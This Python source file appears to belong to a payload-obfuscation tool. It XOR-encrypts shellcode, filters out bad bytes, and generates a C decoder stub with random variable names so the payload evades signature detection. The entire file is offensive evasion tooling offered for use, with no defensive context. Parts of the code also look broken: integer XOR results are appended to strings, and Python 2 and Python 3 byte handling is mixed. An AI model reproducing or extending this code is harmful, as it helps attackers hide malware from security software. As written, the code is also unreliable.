import os,sys
import binascii
import random,string

def varname_creator():
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(6,16)))
    return varname
     
def xor_encryption3(data,key):
    flag = 0
    shellcode = ""
    for b in data:
        if flag == len(key)-1:
            shellcode += b^key[flag] 
            flag = 0
        else: 
            shellcode += b^key[flag]
            flag += 1
        
    return shellcode

def bad_char_inspector(data):
    bad_char_detected=False
    for i in range(0,len(data)):
        if ord(data[i]) == 0:
            bad_char_detected=True
        if ord(data[i]) == 10:
            bad_char_detected=True
        if ord(data[i]) == 13:
            bad_char_detected=True

    return bad_char_detected

def key_gen(keysize):
    key=os.urandom(keysize)
    check_bad_key=True
    check_bad_key=bad_char_inspector(key)
    while check_bad_key == True:
        key=os.urandom(keysize)
        check_bad_key=bad_char_inspector(key)
    return key


def Xor_stub3(shellcode,bufname):
    keysize=random.randint(12,24)
    key=key_gen(keysize)

    encrypted_shellcode=xor_encryption3(shellcode,key)
    check_bad_char=True
    check_bad_char=bad_char_inspector(encrypted_shellcode)

    while check_bad_char == True:
        key=key_gen(keysize)
        encrypted_shellcode=xor_encryption3(shellcode,key)
        check_bad_char=bad_char_inspector(encrypted_shellcode)

    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)

    printable_shellcode = ""
    for i in range(0,len(encrypted_shellcode)-1,2):
        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]

    key = binascii.hexlify(key)
    printable_key = ""
    for i in range(0,len(key)-1,2):
        
        printable_key += "\\x" + key[i] + key[i+1]

    Randflag1 = varname_creator()
    Randflag2 = varname_creator()
    keyname = varname_creator()

    Xor_stub = ""
    Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
    Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
    Xor_stub += "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
    Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
    Xor_stub += Randflag2 + " = 0;\n}" 
    Xor_stub += "else{\n"
    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
    Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"      
    
    return Xor_stub
